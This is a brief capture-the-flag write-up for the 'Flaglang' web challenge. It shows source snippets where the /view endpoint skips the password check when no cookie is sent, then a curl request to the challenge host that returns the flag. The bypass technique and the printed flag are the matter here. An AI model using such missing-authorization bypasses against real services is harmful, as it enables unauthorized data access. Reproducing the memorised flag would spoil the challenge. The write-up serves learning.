<h1> Flaglang </h1>

<p> In this web site we can translate "hello world" in multiples langauges </p>

<img src=start.png width=600 height=300></img>

<p> This web applicationa 2 endpoints: </p>
<ul>
  <li> <strong><i>/switch</i></strong> : Add/Switch cookie for a specific country </li>
  <li> <strong><i>/view</i></strong> : Print the country object in json </li>
</ul>

<p> The flag is store in flagistan Object, but we need to have the falgistan cookie but for that we need a password/p>

```js
const country = countryData[req.query.to];
if (country.password) {
  if (req.cookies.password === country.password) {
    res.cookie('iso', country.iso, { signed: true });
  }
  else {
    res.status(400).send(`error: not authenticated for ${req.query.to}`);
    return;
  }
}
```

<img src=error.png></img>

<p> But in the <i>/view</i> endpoin, we can see that if the cookie dosen't exist it don't do the appriopriate check to see if the country need a password or no </p>

```js
const country = countryData[req.query.country];
const userISO = req.signedCookies.iso;
if (country.deny.includes(userISO)) {
  res.status(400).json({ err: `${req.query.country} has an embargo on your country` });
  return;
}
res.status(200).json({ msg: country.msg, iso: country.iso });
```

<p>So, for see the flagistan country we just have to requests in the <i>view</i> endpoint whithout cookie. </p>

```bash
$ curl https://flaglang.chall.lac.tf/view\?country\=Flagistan
{"msg":"lactf{n0rw3g7an_y4m7_f4ns_7n_sh4mbl3s}","iso":"FL"}
```
